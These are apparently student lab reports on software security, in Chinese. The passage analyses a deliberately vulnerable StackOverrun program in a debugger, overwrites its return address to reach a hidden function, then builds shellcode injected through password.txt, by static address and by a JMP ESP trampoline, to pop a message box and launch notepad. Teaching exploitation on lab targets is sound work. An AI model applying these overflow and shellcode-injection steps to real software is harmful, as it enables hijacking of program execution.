<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img58.png" alt="图58"></p>
<p>11.使用CFF Explorer查看PE节表信息（静态分析），从而找到.text段在文件中的偏移与其在内存中的相对虚拟地址（RVA）。用CFF Explorer打开程序，选择段头部。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img59.png" alt="图59"></p>
<p>12.右侧表格中找到.text行（代码段），记录如下数据</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>字段名称</td>
<td>含义</td>
<td>值</td>
</tr>
<tr>
<td>VirtualAddress</td>
<td>节在内存中的相对地址（RVA）</td>
<td>0x00001000</td>
</tr>
<tr>
<td>Raw Address</td>
<td>节在文件中的偏移地址（文件存储地址）</td>
<td>0x00001000</td>
</tr>
<tr>
<td>VirtualSize</td>
<td>节在内存中的实际大小</td>
<td>0x00003BE6</td>
</tr>
<tr>
<td>Raw Size</td>
<td>节在文件中的存储大小</td>
<td>0x00004000</td>
</tr>
</tbody></table>
<p>13.查看模块加载基址（动态分析）。查看程序在内存中被加载到的实际基址（ModuleBase），以计算.text段的实际内存虚拟地址。将程序通过x32dbg运行，在上方菜单栏中选择视图→模块选择StackOverrun.exe后右键选择在内存布局中转到。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img60.png" alt="图60"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img61.png" alt="图61"></p>
<p>14.可以看到模块加载基址为（ModuleBase）0x00400000,以及代码段地址（.text）为0x00401000。由此可见.text段地址变化：</p>
<p>文件存储地址（PointerToRawData）&#x3D; 0x00001000</p>
<p>内存加载地址（VA）&#x3D; 0x00401000</p>
<p>地址变化规律：VA &#x3D; ModuleBase + VirtualAddress</p>
<p><strong>（三）挑选其中一处函数的跳转，详细分析，跳转时sp，bp，ip的变化</strong></p>
<p>1.挑选一下foo函数分析。程序跳转之前，此时的操作时将ecx压入栈，ecx &#x3D; 00600EBE，00600EBE处的值其实就是我们输入的ABCDRFGHAB，也可以看到栈的具体值。eip：401095，esp：19FF28，ebp：19FF74。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img62.png" alt="图62"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img63.png" alt="图63"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img64.png" alt="图64"></p>
<p>2.将ecx压入栈中后，ESP向上移动四个字节。eip：401096，esp：19FF24，ebp：19FF74。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img65.png" alt="图65"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img66.png" alt="图66"></p>
<p>3.执行CALL stack0ve.00401000 进行跳转，各个寄存器的情况如上所示，ESP向上移动四个字节，新增加的栈顶存储的是main()函数的返回地址 0040109B。eip：401000，esp：19FF20，ebp：19FF74。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img67.png" alt="图67"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img68.png" alt="图68"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img69.png" alt="图69"></p>
<p>4.然后此时已经是foo函数的操作，继续执行SUB ESP，0C，栈顶向上移动12字节。eip：401003，esp：19FF14，ebp：19FF74。最后我们可以知道的是在调用函数时，先将调用参数入栈(0x00600EBE)，然后将返回地址入栈(0X0040109B)，最后将局部参数入栈。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img70.png" alt="图70"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img71.png" alt="图71"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img72.png" alt="图72"></p>
<p><strong>（四）推测程序的功能</strong></p>
<p>注意到foo和bar函数的地址为401000和401060，以及当在foo函数中运行时，此时对应的输出即为esp向下的40个字节的栈的值。bar函数为直接打印一个字符串”Augh! I’ve been hacked!\n”。所以推测程序为由三个函数组成，一个main函数，两个子函数foo和bar,main函数打印两个子函数的起始地址，然后调用 foo 函数。foo函数打印当前栈顶向下40个字节的地址，bar函数打印一串字符串”Augh! I’ve been hacked!\n”。正常程序是不会调用bar函数。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img73.png" alt="图73"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img74.png" alt="图74"></p>
<h3 id="实验三步骤与结果"><a href="#实验三步骤与结果" class="headerlink" title="实验三步骤与结果"></a>实验三步骤与结果</h3><p><strong>修改StackOverrun程序的流程</strong></p>
<p>1.查看foo函数可以知道，foo需要一个输入作为参数，StackOverrun\StackOverrun.exe” 1234567891，以1234567891运行程序。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img75.png" alt="图75"></p>
<p>2.可以看到会打印出1234567891，并且在00401032和0040102B处，我们看到rep movsd是将前8位复制给buf，rep movsb，将剩下的复制过去。因此复制不进行字符串输入的检查，因此可以使用栈溢出攻击。并且这里存在返回地址，索性直接bar的地址（00401060）覆盖返回地址。所以可设计输入字符串为ABCDEFGHABCD`@，并运行。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img76.png" alt="图76"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img77.png" alt="图77"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img78.png" alt="图78"></p>
<p>3.可以看到已经将返回地址通过栈溢出修改为bar的地址（00401060）。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img79.png" alt="图79"></p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img80.png" alt="图80"></p>
<p>4.然后可以成功调用bar函数，并打印出对应需要的结果Augh! I’ ve been hacked!。但是程序最后会出现异常，因为随意覆盖代码会导致栈不平衡。至此完成淹没返回地址调用bar函数，输入参数可为ABCDEFGHABCD`@。</p>
<p><img src="/2025/10/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2/img81.png" alt="图81"></p>
<h3 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h3><p>通过本次实验，我对栈溢出攻击的原理、实现方式及其危害性有了系统而深入的理解，并成功完成了栈溢出攻击的实践操作。栈溢出，或称缓冲区溢出，是一种危害性极高的安全漏洞，其本质在于当程序向栈上的缓冲区写入数据时，若未对输入长度进行有效校验，导致写入的数据量超过了缓冲区自身的容量，多余的数据便会覆盖相邻的内存区域。</p>
<p>在函数调用栈中，局部变量与函数的返回地址紧密相邻。因此，一旦攻击者通过诸如strcpy等不安全的函数将精心构造的过长数据复制到缓冲区，不仅能淹没相邻变量改变程序逻辑，更关键的是可以覆盖函数的返回地址。这将直接劫持程序的执行流程，使程序在函数返回时跳转到攻击者指定的任意地址，从而执行恶意代码。</p>
<p>实验过程中，我使用x32dbg调试工具，具体分析了PE格式文件从硬盘加载到内存后的地址映射关系，并深入观察了函数调用过程中SP、BP、IP等寄存器的动态变化以及栈帧的构建与销毁过程。通过对StackOverrun程序这一“靶子”的调试分析，我直观地验证了上述理论。最终，我通过精确计算偏移并构造输入数据，成功利用淹没返回地址的技术修改了程序流程，实现了让其跳转至bar函数执行的目标。</p>
<p>这次实践让我深刻认识到，此类漏洞的根源在于开发阶段对内存安全缺乏足够的重视。因此，在软件开发中，实施严格的输入验证是至关重要的防御基石。我们必须避免使用gets、strcpy等存在已知风险的传统函数，转而采用具备边界检查的安全函数（如fgets、strncpy），从编码环节确保内存操作的可靠性，以从根本上杜绝溢出风险。这次实验不仅锻炼了我的动手调试与分析能力，更极大地强化了我对系统底层机制和安全编程原则的理解，对提升软件安全开发意识具有重要意义。</p>
<p><em>实验报告持续更新中…</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>北邮</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验3：shellcode注入</title>
    <url>/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全第三次实验报告"><a href="#软件安全第三次实验报告" class="headerlink" title="软件安全第三次实验报告"></a>软件安全第三次实验报告</h2><h3 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h3><p>1.了解shellcode注入原理</p>
<p>2.理解给出的弹出对话框的汇编代码</p>
<p>3.通过淹没静态地址来实现shellcode的代码植入</p>
<p>4.通过跳板来实现shellcode的代码植入</p>
<p>5.尝试修改汇编语句的shellcode实现修改标题等简单操作<strong>（1~5目标记作实验一）</strong></p>
<p>6.在不修改StackOverrun程序源代码的情况下，构造shellcode，通过JMP ESP的方式实现通过记事本打开shellcode.txt（可实验CreateProcessA或WinExec等API）。<strong>（记作实验二）</strong></p>
<h3 id="实验一步骤与结果"><a href="#实验一步骤与结果" class="headerlink" title="实验一步骤与结果"></a>实验一步骤与结果</h3><p><strong>（一）创建可执行程序</strong></p>
<p>1.进入虚拟机，打开shellcode实验文件夹下的overflow_exe的c文件。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%871.png" alt="图1"></p>
<p>2.读懂main.cpp文件。</p>
<p>（1）首先分析verify_password函数：</p>
<p>a）传入参数：char *password是一个名为password的字符数组。</p>
<p>b）函数中定义了一个整型变量authenticated和一个长度为44的字符数组buffer[]。</p>
<p>c）调用strcmp函数比较password和常量PASSWORD两个字符串，并将比较结果赋值给authenticated。</p>
<p>d）进行字符串比较后，调用strcpy函数将字符串password的内容复制到buffer数组中。</p>
<p>e）函数最后返回变量authenticated。</p>
<p>（2）接下来分析main函数：</p>
<p>a）首先定义了一个初始值为0的整型变量valid_flag和一个长度为1024的字符数组password[]。</p>
<p>b）接下来程序读取password.txt文件，将文件内容字符串赋值给password。</p>
<p>c）调用veriy_password函数，将password作为参数传入，返回值赋值给valid_flag。</p>
<p>d）若valid_flag不等于0，即strcmp结果不为0，说明password与正确密码PASSWORD不符，打印提示信息“incorrect password!\n\n”。</p>
<p>e）若valid_flag等于0，即strcmp结果为0，说明password与正确密码PASSWORD相同，打印提示信息“Congratulation! You have passed the verification!\n”。</p>
<p>（3）由以上分析可知，密码验证程序起到的作用是：正确密码为1234567。读取password.txt中字符串，若与正确密码相同，则通过验证；若与正确密码不同，则验证失败。</p>
<p>3.自己新建一个工程main3_project，并在工程中新建一个文件main3.cpp，将c文件的内容复制进去。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%872.png" alt="图2"></p>
<p>4.运行程序。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%873.png" alt="图3"></p>
<p>5.这个程序与之前的实验的程序有3处不同：</p>
<p>（1）增加头文件windows.h，以便能调用LoadLibrary函 数去装载user32.dll；</p>
<p>（2）Verify_password的buffer变量增加到44字节，以 便能够承载我们的shellcode；</p>
<p>（3）Main函数装载user32.dll以便能在植入代码中调用 MessageBox。</p>
<p><strong>（二）寻找dll中函数地址</strong></p>
<p>1.程序调通运行不报错后，运行dependency walker程序。点击桌面上的depends.exe进入程序，打开我们生成的main3_project.exe。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%874.png" alt="图4"></p>
<p>2.点击剖析→开始剖析，参数保持默认。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%875.png" alt="图5"></p>
<p>3.点击kernel32.dll，在右侧能找到exitprocess的函数入口点的偏移地址为0x0001B0BB。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%876.png" alt="图6"></p>
<p>4.用相同的步骤查出MessageBoxA的函数入口地址，此函数属于user32.dll库。由下图可知，MessageBoxA的函数入口的偏移地址为0x00033D68。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%877.png" alt="图7"></p>
<p>5.在下方查看到KERNEL32.DLL的实际基址为0x77E60000，USER32.DLL的实际基址为0x77DF0000。由此加上偏移地址，可知ExitProcess函数和MessageBoxA函数的实际地址分别为0x77E7BB0B、0x77E23D68。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%878.png" alt="图8"></p>
<p><strong>（三）调试shellcode并查找overflow_exe中的shellcode起始地址</strong></p>
<p>1.新建项目shellcode_project，新建文件shellcode_main，将shellcode实验下的shellcode文件内容复制到新文件中。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%879.png" alt="图9"></p>
<p>2.修改部分代码：可以修改bupt字符串，即弹出框的标题等。两个函数的入口必须修改成所计算出的地址。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8710.png" alt="图10"></p>
<p>3.运行程序，如下图所示成功弹出对话框。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8711.png" alt="图11"></p>
<p>4.用odllydbg打开shellcode的exe文件。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8712.png" alt="图12"></p>
<p>5.找到我们写的那些汇编语言。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8713.png" alt="图13"></p>
<p>6.复制选定我们需要的部分：从xor ebp,ebp开始，到call eax结束（调用exit process的那个call eax），右键保存到文件，我们就得到了操作码的文件opcode2.txt。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8714.png" alt="图14"></p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8715.png" alt="图15"></p>
<p>7.接下来要查找overflow_exe中的shellcode的起始地址。首先在main3_project文件夹中新建password.txt文件，在其中写上正确密码1234567。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8716.png" alt="图16"></p>
<p>8.用ollydbg打开overflow_exe的exe文件，在strcpy处添加断点(F2)。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8717.png" alt="图17"></p>
<p>9.开始执行到断点处，查看缓冲区信息，我们发现dest的提示，就是我们要注入的shellcode的起始地址0012FAF0。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8718.png" alt="图18"></p>
<p><strong>（四）采用静态地址跳转的方法进行注入</strong></p>
<p>1.用UltraEdit打开password.txt并切换成十六进制编辑的方式。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8719.png" alt="图19"></p>
<p>2.计算一下我们发现返回地址应该在44(buff)+ 4(authenticated)+4(EBP)&#x3D;52的偏移后，即第53-56字节。</p>
<p>我们构造的txt文件格式应该是这样的：Shellcode + 0x90若干 + shellcode在缓冲区的起始地址（注意逆序填写）。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8720.png" alt="图20"></p>
<p>3.正确填写后保存到overflow_exe项目的debug目录下并运行exe程序，看是否弹出对话框，并产生错误提示。完成后可以将password.txt重命名为passworda.txt，因为之后还要新制作一个名为password的txt文件。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8721.png" alt="图21"></p>
<p><strong>（五）利用跳板来进行shellcode注入</strong></p>
<p>1.首先在main3_project项目的Debug文件夹下新建一个内容为“1234567”的password.txt文件。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8722.png" alt="图22"></p>
<p>2.用Ollydbg打开main3_project.exe，在strcpy函数上设置断点，运行至断点，然后右键选择overflow return address→ASCII overflow returns→search JMP&#x2F;CALL ESP。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8723.png" alt="图23"></p>
<p>3.等待搜索完毕后点击日志查看（L图标的按钮）。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8724.png" alt="图24"></p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8725.png" alt="图25"></p>
<p>4.查看日志后，我们选择一条在user32中的JMP ESP指令，记录它的地址0x77E2E32A，用ultraedit打开password.txt，这次的文件结构为52字节填充物+4字节JMP ESP地址（逆序）+shellcode（可选+若干0x90）。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8726.png" alt="图26"></p>
<p>5.运行exe程序，观察结果。如下图所示，成功弹出弹窗显示“BUPTBUPT”。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8727.png" alt="图27"></p>
<p>6.修改password.txt在buptbupt处的操作码，我修改成AGPTAGPT。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8728.png" alt="图28"></p>
<p>7.重新运行exe程序，可以看到弹出窗口。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8729.png" alt="图29"></p>
<h3 id="实验二步骤与结果"><a href="#实验二步骤与结果" class="headerlink" title="实验二步骤与结果"></a>实验二步骤与结果</h3><h4 id="编写shellcode-cpp"><a href="#编写shellcode-cpp" class="headerlink" title="编写shellcode.cpp"></a>编写shellcode.cpp</h4><p>为了通过记事本打开shellcode.txt，首先用汇编语言编写shellcode.cpp文件，在其中构建WinExec函数栈，达到运行shellcode.cpp即可通过记事本打开shellcode.txt的目的。</p>
<p><strong>（一）设计shellcode.cpp中的函数栈</strong></p>
<p>1.WinExec函数：WinExec主要运行exe文件，不能运行其他类型的文件，不用引用特别单元。</p>
<p>（1）函数原型：UINT WinExec（exePath,ShowCmd）</p>
<p>（2）函数参数：</p>
<p>①参数1-exePath：命令行参数。注意，要用pChar转化一下。</p>
<p>②参数2-ShowCmd：外部程序的运行方式。其取值如下：</p>
<p>SW_HIDE &#x3D; 0; {隐藏, 并且任务栏也没有最小化图标}</p>
<p>SW_SHOWNORMAL &#x3D; 1; {用最近的大小和位置显示, 激活}</p>
<p>SW_NORMAL &#x3D; 1; {同 SW_SHOWNORMAL}</p>
<p>SW_SHOWMINIMIZED &#x3D; 2; {最小化, 激活}</p>
<p>SW_SHOWMAXIMIZED &#x3D; 3; {最大化, 激活}</p>
<p>SW_MAXIMIZE &#x3D; 3; {同 SW_SHOWMAXIMIZED}</p>
<p>SW_SHOWNOACTIVATE &#x3D; 4; {用最近的大小和位置显示, 不激活}</p>
<p>SW_SHOW &#x3D; 5; {同 SW_SHOWNORMAL}</p>
<p>SW_MINIMIZE &#x3D; 6; {最小化, 不激活}</p>
<p>SW_SHOWMINNOACTIVE &#x3D; 7; {同 SW_MINIMIZE}</p>
<p>SW_SHOWNA &#x3D; 8; {同 SW_SHOWNOACTIVATE}</p>
<p>SW_RESTORE &#x3D; 9; {同 SW_SHOWNORMAL}</p>
<p>SW_SHOWDEFAULT &#x3D; 10; {同 SW_SHOWNORMAL}</p>
<p>SW_MAX &#x3D; 10; {同 SW_SHOWNORMAL}</p>
<p>（3）因此，想要用记事本打开shellcode.txt文件，shellcode.cpp程序应该以正常方式运行**<em>WinExec（pChar(‘notepad.exe shellcode.txt’)，SW_SHOWNORMAL）</em>**</p>
<p>（4）根据以上分析，shellcode中构造的WinExec函数栈应该如下图所示：</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8730.png" alt="图30"></p>
<p>WinExec函数栈</p>
<p>2.ExitProcess函数：为了使得程序在成功使用记事本打开shellcode.txt后可以自行结束shellcode.cpp程序而去执行原程序接下来的正常步骤，要在WinExec函数执行结束后调用ExitProcess函数结束程序。</p>
<p>3.据此，编写shellcode.cpp还需要知道：</p>
<p>①字符串str的十六进制表达；</p>
<p>②参数1（指向str的指针）；</p>
<p>③WinExec的实际入口地址；</p>
<p>④ExitProcess的实际入口地址。</p>
<p><strong>（二）查看字符串“notepad.exe shellcode.txt”的十六进制</strong></p>
<p>（1）利用UltraEdit打开shellcode.cpp文件，输入notepad.exe shellcode.txt。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8731.png" alt="图31"></p>
<p>（2）点击上方按钮转成十六进制，即可得到此语句所对应的十六进制内容。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8732.png" alt="图32"></p>
<p><strong>（三）得到指向字符串“notepad.exe shellcode.txt”的指针</strong></p>
<p>由于在程序构造函数栈时，会首先向栈内压入str[24]&#x3D;“notepad.exe shellcode.txt”字符串，因此使所需的参数1指针指向栈内字符串开头str[0]即可。</p>
<p>而利用栈指针的特点，在字符串入栈完成后，栈顶指针esp所指向的栈顶位置恰好就是str[0]的位置，因此在此时将esp赋值给参数1即为指向字符串str的指针。</p>
<p>利用以下语句：</p>
<p><strong>mov eax,esp</strong></p>
<p><strong>push ebx</strong></p>
<p><strong>…</strong></p>
<p><strong>push eax</strong></p>
<p>即可完成参数1的入栈。</p>
<p><strong>（四）查找WinExec函数的入口地址</strong></p>
<p>1.使用Depends.exe打开Stackoverrun的可运行程序（main3_project.exe），点击“剖析→开始剖析→确定”。</p>
<p>2.WinExec函数属于Kernel32.dll，找到WinExec函数可知，其相对入口地址为0x00018601。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8733.png" alt="图33"></p>
<p>3.在下方查看到Kernel32.dll的实际基址为0x77E60000。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8734.png" alt="图34"></p>
<p>4.由Kernel32.dll的实际基址与WinExec函数的相对入口地址相加可得，WinExec函数的实际入口地址为0x77E78601。</p>
<p><strong>（五）查找ExitProcess函数的入口地址</strong></p>
<p>1.ExitProcess函数属于Kernel32.dll，找到WinExec函数可知，其相对入口地址为0x0001B0BB。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8735.png" alt="图35"></p>
<p>2.由Kernel32.dll的实际基址与WinExec函数的相对入口地址相加可得，WinExec函数的实际入口地址为0x77E7B0BB。</p>
<p><strong>（六）编写shellcode.cpp</strong></p>
<p>1.程序开头增加头文件windows.h，接下来调用LoadLibrary函数去装载kernel32.dll。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8736.png" alt="图36"></p>
<p>2.在栈中首先压入之前得到的字符串”notepad.exe shellcode.txt”十六进制内容（倒序压入）。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8737.png" alt="图37"></p>
<p>3.在将参数字符串压入栈后，将压入字符串后的栈顶指针赋值给eax，即为字符串str的地址指针，即WinExec函数的参数1。</p>
<p>4.在压入WinExec函数的两个参数时，考虑到栈的先入后出特点，首先压入参数2（SW_SHOWNORMAL&#x3D;5），再压入参数1（指向str的指针，现暂存于eax中）。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8738.png" alt="图38"></p>
<p>5.在参数都入栈完毕后，调用WinExec函数，执行**<em>WinExec（pChar(‘notepad.exe shellcode.txt’)，SW_SHOWNORMAL）</em>**后，再调用ExitProcess函数结束shellcode.cpp程序。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8739.png" alt="图39"></p>
<p>6.由以上分析得，编写的shellcode.cpp代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    HINSTANCE LibHandle;  </span><br><span class="line">    <span class="type">char</span> dllbuf[<span class="number">13</span>] = <span class="string">&quot;kernel32.dll&quot;</span>;  </span><br><span class="line">    LibHandle = <span class="built_in">LoadLibrary</span>(dllbuf);  </span><br><span class="line">    _asm&#123;  </span><br><span class="line">        sub sp,<span class="number">0x440</span>  </span><br><span class="line">        <span class="keyword">xor</span> ebx,ebx  </span><br><span class="line">        push ebx  </span><br><span class="line">        push <span class="number">0x74</span>  </span><br><span class="line">        push <span class="number">0x78742E65</span>  </span><br><span class="line">        push <span class="number">0x646F636C</span>  </span><br><span class="line">        push <span class="number">0x6C656873</span>  </span><br><span class="line">        push <span class="number">0x20657865</span>  </span><br><span class="line">        push <span class="number">0x2E646170</span>  </span><br><span class="line">        push <span class="number">0x65746F6E</span>  </span><br><span 